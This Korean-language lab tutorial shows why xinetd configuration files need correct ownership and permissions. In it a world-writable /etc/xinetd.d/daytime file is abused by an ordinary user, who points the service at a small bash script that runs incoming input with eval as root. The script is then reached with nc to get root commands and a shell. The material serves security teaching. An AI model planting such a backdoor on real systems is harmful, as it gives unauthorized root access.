## /etc/(x)inetd.conf 파일 소유자 및 권한 설정

누구나 `xinetd` 설정 파일을 수정할 수 있으면 어떤 문제가 발생할 수 있는지 알아봅시다.

### 실습 1 : `xinetd` 설정 파일 수정을 통한 간단한 백도어 생성

**[취약한 리눅스 서버 관리자] 취약한 시스템을 만듭시다!**

1. 우선 슈퍼 데몬인 `xinetd`를 설치합니다.

```
cju@wooam:~$ sudo apt install xinetd
```

2. `xinetd.conf` 파일의 접근 권한을 살펴봅시다.

```
cju@wooam:~$ ls -l /etc/xinet.conf
```

3. `xinetd.conf` 파일의 내용도 살펴봅시다. `/etc/xinetd.d` 디렉터리를 포함(`includedir`)하는 것을 확인할 수 있습니다.

```
cju@wooam:~$ cat /etc/xinetd.conf
# Simple configuration file for xinetd
#
# Some defaults, and include /etc/xinetd.d/

defaults
{

# Please note that you need a log_type line to be able to use log_on_success
# and log_on_failure. The default is the following :
# log_type = SYSLOG daemon info

}

includedir /etc/xinetd.d
```

4. `/etc/xinetd.d` 디렉토리를 살펴봅시다.

```
cju@wooam:~$ ls /etc/xinetd.d/
chargen  chargen-udp  daytime  daytime-udp  discard  discard-udp  echo  echo-udp  servers  services  time  time-udp
```

5. `/etc/xinetd.d` 디렉터리 파일 중 하나의 접근 권한을 `-rw-rw-rw-`로 변경합니다. 여기서는 `daytime`의 접근 권한을 변경합니다.

```
cju@wooam:~$ sudo chmod 666 /etc/xinetd.d/daytime
```

**[공격자] `daytime` 서비스 대신 백도어를 올립니다!**

> 공격자가 취약한 리눅스 서버에 일반 사용자 계정으로 접속했다고 가정합니다.

6. `xinetd` 관련 파일의 접근 권한을 살펴봅시다. `/etc/xinetd.d/daytime` 파일을 아무나 수정할 수 있음을 발견합니다.

```
aaa@wooam:~$ ls -l /etc/xinetd.conf /etc/xinetd.d
```

7. 아래와 같이 간단한 백도어를 만듭니다.

```
aaa@wooam:~$ cat hola
#!/bin/bash
read yourcommand
eval $yourcommand
echo "Thanks you for using this backdoor!"
```

8. 만든 백도어 파일에 실행 권한을 부여합니다.

```
aaa@wooam:~$ chmod 755 hola
```

9. `/etc/xinetd.d/daytime` 파일을 아래와 같이 수정합니다. `disable = no`로 수정하고 `type = INTERNAL` 라인은 삭제합니다. 그리고 `server = /home/aaa/hola`를 추가합니다.

```
aaa@wooam:~$ cat /etc/xinetd.d/daytime
# default: off
# description: An internal xinetd service which gets the current system time
# then prints it out in a format like this: "Wed Nov 13 22:30:27 EST 2002".
# This is the tcp version.
service daytime
{
	disable		= no
	id		= daytime-stream
	socket_type	= stream
	protocol	= tcp
	user		= root
	wait		= no
	server		= /home/aaa/hola
}

# This is the udp version.
service daytime
{
	disable		= yes
	type		= INTERNAL
	id		= daytime-dgram
	socket_type	= dgram
	protocol	= udp
	user		= root
	wait		= yes
}

```

10. `xinetd` 서비스가 재시작되었다고 가정합니다.

```
cju@wooam:~$ sudo systemctl restart xinetd
```

**[공격자] `daytime` 백도어를 통해 자유롭게 시스템을 사용합니다!!!**

11. `nc` 명령어를 이용하여 백도어에 접근합니다.

```
┌──(kali㉿kali)-[~]
└─$ nc -v 192.168.xxx.xxx 13
192.168.102.128: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.xxx.xxx] 13 (daytime) open
whoami
root
```

12. 셸도 실행 가능합니다!

```
┌──(kali㉿kali)-[~]
└─$ nc -v 192.168.xxx.xxx 13
192.168.102.128: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.xxx.xxx] 13 (daytime) open
sh
pwd
/
exit
```